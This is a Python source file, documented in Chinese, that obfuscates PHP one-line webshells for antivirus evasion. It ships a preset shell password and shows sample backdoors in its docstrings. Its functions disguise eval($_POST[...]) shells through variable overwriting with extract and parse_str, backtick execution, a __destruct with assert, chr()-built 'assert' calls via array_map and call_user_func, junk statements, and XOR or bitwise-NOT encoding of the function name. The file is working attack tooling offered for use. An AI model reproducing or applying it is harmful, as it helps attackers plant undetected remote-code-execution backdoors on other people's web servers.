'''
一句话混淆操作库，编写了各种一句话混淆操作

由于PHP代码复杂，重新编写PHP的解析方法是没有必要的，这里只简单的替换一些全局变量，对类变量等不提供覆盖方法
并且不保证每次都成功，只给出经过部分测试的变化过程

目前支持：
单一待执行变量（只eval一次）；
webshell的password必须字母开头，且需要提前设置；
webshell会偏向于使用GET进行passwd传递
混淆后的shell功能可能发生变化，可能为eval型，也可能为system型；因为目标是生成可用shell而不用关注功能是否完全变化

参考资料：
https://xz.aliyun.com/t/3959
https://yzddmr6.tk/posts/webshell-venom-1-0/
'''

from utils import *

# ------------配置区------------
RAND_STR_LEN = 10  # 生成的随机变量名的长度
shell_passwd = 'hachp1'
# ------------配置区------------


def extract_encode(orig_shell):
    '''
    1.	extract变量覆盖结合反引号
    输入：未混淆的payload字符串，注意，此函数只能变化一次，
    因为变化类似于将POST[]改为POST，更改后将不再存在[]，不能继续混淆
    输出：混淆后的payload字符串


    eval($_POST[1])  ->
    $a=1;$b=$_POST[1];extract($b);print_r(`$a`)
    1. 将执行语句替换为反引号
    2. 将所有魔术变量替换掉
    '''
    # 替换eval语句
    eval_things = eval_thing_par.findall(orig_shell)
    eval_things_ic = eval_thing_ic_par.findall(orig_shell)
    try:
        temp = orig_shell.replace(eval_things_ic[0],
                                  'print_r(`' + eval_things[0] + '`)')
    except IndexError:
        # print('[w] eval string count\'t found, skip eval-change step!')
        temp = orig_shell
        # return orig_shell

    # 替换魔术变量
    magic_vars = magic_par.findall(temp)

    for mv in magic_vars:
        if ('[' not in mv) and ('{') not in mv:
            # print('[w] par\'s key count\'t found, skip var-change step!')
            return orig_shell

        str_b = random_string(RAND_STR_LEN)
        try:
            add_enc_par = ('${}=1;${}=' + re.findall('\$_\w+', mv)[0] +
                           ';extract(${});').format(shell_passwd, str_b,
                                                    str_b)  # 待添加字符串
        except IndexError:
            return orig_shell

        fst_space = orig_shell.find('<?php')  # 需要在php代码块内部进行操作，先匹配出代码块位置
        # 替换掉原参数，并把原参数的转义式添加在前

        temp = temp[:fst_space+6]+add_enc_par + \
            temp[fst_space+6:].replace(mv, '$' +
                                       shell_passwd)  # '<?php ' 共6位，需要剪切至第6位

    return temp


def parse_str_encode(orig_shell):
    '''
    2.	parse_str 变量覆盖


    输入：未混淆的payload字符串
    输出：混淆后的payload字符串
    支持多次重复编码

    eval($_POST[hachp1]);

    ->

    $a=1;
    $b="a=".$_GET[hachp1];
    parse_str($b);
    print_r(`$a`);

    '''
    # 替换eval语句
    eval_things = eval_thing_par.findall(orig_shell)
    eval_things_ic = eval_thing_ic_par.findall(orig_shell)
    try:
        temp = orig_shell.replace(eval_things_ic[0],
                                  'print_r(`' + eval_things[0] + '`)')
    except IndexError:  # 若匹配失败，则默认使用反引号进行
        # print('[w] eval string count\'t found, skip eval-change step!')
        temp = orig_shell
        # return orig_shell

    # 替换魔术变量
    magic_vars = magic_par.findall(temp)

    for mv in magic_vars:
        if ('[' not in mv) and ('{') not in mv:
            # print('[w] par\'s key count\'t found, skip var-change step!')
            return orig_shell

        str_a = random_string(RAND_STR_LEN)
        str_b = random_string(RAND_STR_LEN)
        add_enc_par = ('${}=1;${}="{}=".' + mv + ';parse_str(${});').format(
            str_a, str_b, str_a, str_b)  # 原参数编码

        fst_space = orig_shell.find('<?php')  # 需要在php代码块内部进行操作，先匹配出代码块位置
        temp = temp[:fst_space +
                    6] + add_enc_par + temp[fst_space + 6:].replace(
                        mv, '$' + str_a)  # '<?php ' 共6位，需要剪切至第6位

        # temp = add_enc_par+temp.replace(mv, '$'+str_a)

    return temp


def destruct_encode(orig_shell):
    '''
    3. __destruct 析构函数

    将执行语句放入析构函数，支持多次编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串

    <?php 

    class User //变量名1
    {
    public $name = ''; //变量名2

    function __destruct(){
        eval("$this->name");//插入执行语句
    }
    }

    $user = new User; //变量名3
    $user->name = ''.$_POST['hachp1']; //这两句为调用，将原操作替换掉即可（需要匹配 print_r(`xxx`)
    ?>

    '''
    eval_things_ic = eval_thing_ic_par.findall(orig_shell)
    magic_vars = magic_par.findall(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    str_b = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)

    str_to_add = 'class {}{{public ${} = \'\';function __destruct(){{assert("$this->{}");}}}}'.format(
        str_a, str_b, str_b)
    try:
        eval_str = '${} = new {};${}->{} = \'\'.{}'.format(
            str_c, str_a, str_c, str_b, magic_vars[0])
    except IndexError:
        return orig_shell

    fst_space = orig_shell.find('<?php')  # 需要在php代码块内部进行操作，先匹配出代码块位置
    # temp=temp[:fst_space+6]+add_enc_par+temp[fst_space+6:].replace(mv, '$'+str_a) # '<?php ' 共6位，需要剪切至第6位

    try:
        temp = orig_shell[:fst_space+6]+str_to_add + \
            orig_shell[fst_space+6:].replace(eval_things_ic[0], eval_str)
    except IndexError:
        eval_things_ic = eval_thing2_ic_par.findall(orig_shell)
        temp = orig_shell[:fst_space+6]+str_to_add + \
            orig_shell[fst_space+6:].replace(eval_things_ic[0], eval_str)

    return temp


def null_encode(orig_shell):
    '''
    4. null 拼接
    将null拼接到待执行变量前，支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串

    <?php
    $name = $_GET['name'];//变量1
    $name1=$name2= null;//变量2、变量3
    eval($name1.$name2.$name);
    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    str_b = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}={};${}=${}=null;assert(${}.${}.${})'''.format(
        str_c, eval_thing, str_a, str_b, str_a, str_b, str_c)

    return orig_shell.replace(eval_thing_ic, temp)


def quote_encode(orig_shell):
    '''
    5. '' 拼接
    将''拼接到待执行变量前，支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串

    <?php
    $name = $_GET['name'];//变量1
    $name1=$name2= '';//变量2、变量3
    eval($name1.$name2.$name);

    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    str_b = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}={};${}=${}='';assert(${}.${}.${})'''.format(
        str_c, eval_thing, str_a, str_b, str_a, str_b, str_c)
    return orig_shell.replace(eval_thing_ic, temp)


def quotenull_encode(orig_shell):
    '''
    6. '' null 拼接
    将''+null拼接到待执行变量前，支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串

    <?php
    $a = $_GET['a'];
    $b = '';
    $c = null; //变量1
    eval($b.$c.$a); //变量2
    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    str_b = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}={};${}='';${}=null;assert(${}.${}.${})'''.format(
        str_c, eval_thing, str_a, str_b, str_a, str_b, str_c)
    return orig_shell.replace(eval_thing_ic, temp)


def array_map_encode(orig_shell):
    '''
    7. array_map函数
    使用array_map混淆执行函数，注：不支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串


    <?php
    $x123 =array($_GET['x']);//变量1

    function user()
    {
        $a123 =  chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);//assert  变量2
        return ''.$a123;
    }
    $a123 = user();//assert 
    array_map($a123,$a123 = $x123);
    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)  # 3
    str_a = random_string(RAND_STR_LEN)
    func_name = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}=array({});function {}(){{${}=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);return ''.${};}}${}={}();array_map(${},${}=${})'''.format(
        str_a, eval_thing, func_name, str_c, str_c, str_c, func_name, str_c,
        str_c, str_a)
    return orig_shell.replace(eval_thing_ic, temp)


def call_user_func_array_encode(orig_shell):
    '''
    8. call_user_func_array函数
    使用call_user_func_array混淆执行函数，注：不支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串


    <?php
    $aa = array($_GET['x']);

    function a(){
        return 'assert';
    }
    $a=a();
    call_user_func_array($a,$a=$aa);
    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    func_name = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}=array({});function {}(){{${}=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);return ''.${};}}${}={}();call_user_func_array(${},${}=${})'''.format(
        str_a, eval_thing, func_name, str_c, str_c, str_c, func_name, str_c,
        str_c, str_a)
    return orig_shell.replace(eval_thing_ic, temp)


def call_user_func_encode(orig_shell):
    '''
    9. call_user_func函数
    使用call_user_func混淆执行函数，注：不支持重复编码

    输入：未混淆的payload字符串
    输出：混淆后的payload字符串


    <?php
    function a(){
        return 'assert';
    }
    $a=a();
    $aa=$_GET['x'];
    call_user_func($a,$a=$aa);
    ?>
    '''
    eval_thing = get_eval_thing(orig_shell)
    eval_thing_ic = get_eval_thing_ic(orig_shell)
    str_a = random_string(RAND_STR_LEN)
    func_name = random_string(RAND_STR_LEN)
    str_c = random_string(RAND_STR_LEN)
    temp = '''${}={};function {}(){{${}=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116);return ''.${};}}${}={}();call_user_func(${},${}=${})'''.format(
        str_a, eval_thing, func_name, str_c, str_c, str_c, func_name, str_c,
        str_c, str_a)
    return orig_shell.replace(eval_thing_ic, temp)


def add_a_math(orig_shell):
    '''
    10. 在随机的某分号后添加一行随机的加减乘除

    避开class、if、for、while的区域
    支持重复编码
    '''
    math_op = ['+', '-', '*', '/']
    str_a = random_string(RAND_STR_LEN)
    add_str = '$'+str_a+'='+str(random.randint(0, 100))+math_op[random.randint(0, 3)]\
        + str(random.randint(0, 100)) + \
        math_op[random.randint(0, 3)]+str(random.randint(0, 100))+';\n'

    add_pos = orig_shell.find(';', random.randint(0, len(orig_shell)))

    class_fields = get_class_fields(orig_shell)
    if_fields = get_if_fields(orig_shell)
    for_fields = get_for_fields(orig_shell)
    while_fields = get_while_fields(orig_shell)

    forbid_fields = class_fields+if_fields+for_fields+while_fields

    temp_field = is_in_fields(add_pos, forbid_fields)

    if temp_field is False:
        add_pos+=1
        pass
    else:
        add_pos = forbid_fields[temp_field][0]

    
    return orig_shell[:add_pos] + '\n' + add_str + orig_shell[add_pos:]


def add_a_echo(orig_shell):
    '''
    11. 随机在某个分号后添加一个输出

    避开class、if、for、while的区域
    支持重复编码
    '''

    add_pos = orig_shell.find(';', random.randint(0, len(orig_shell)))
    add_str = 'echo "' + random_string(RAND_STR_LEN) + '";\n'

    class_fields = get_class_fields(orig_shell)
    if_fields = get_if_fields(orig_shell)
    for_fields = get_for_fields(orig_shell)
    while_fields = get_while_fields(orig_shell)

    forbid_fields = class_fields+if_fields+for_fields+while_fields

    temp_field = is_in_fields(add_pos, forbid_fields)


    if temp_field is False:  # 未在class中或者不存在class
        add_pos+=1
        pass
    else:
        add_pos = forbid_fields[temp_field][0]

    # print(add_str)

    return orig_shell[:add_pos] + '\n' + add_str + orig_shell[add_pos:]


def xor_encode(orig_shell):
    '''
    12. 异或免杀
    使用异或编码执行函数的名称
    '''
    eval_pos=get_eval_fun_pos(orig_shell)

    if eval_pos == None:
        return orig_shell

    xor_string = orig_shell[eval_pos[0]:eval_pos[1]]

    func_line1 = ''
    func_line2 = ''
    str_a = random_string(RAND_STR_LEN)
    key = random_keys(len(xor_string))
    for i in range(0, len(xor_string)):
        enc = xor(xor_string[i], key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = '${}=\'{}\'^"{}";${}'.format(str_a, func_line1, func_line2,
                                           str_a)

    return orig_shell[:eval_pos[0]]+payload+orig_shell[eval_pos[1]:]


def not_encode(orig_shell):
    '''
    13. 按位非免杀
    使用按位非编码执行函数的名称
    '''

    eval_pos=get_eval_fun_pos(orig_shell)
    
    if eval_pos == None:
        return orig_shell

    eval_func = orig_shell[eval_pos[0]:eval_pos[1]]

    func_line1 = ''
    str_a = random_string(RAND_STR_LEN)

    for i in range(0, len(eval_func)):
        enc = bit_not(eval_func[i])
        func_line1 += enc
    payload = '${}=~"{}";${}'.format(str_a, func_line1, str_a)

    return orig_shell[:eval_pos[0]]+payload+orig_shell[eval_pos[1]:]
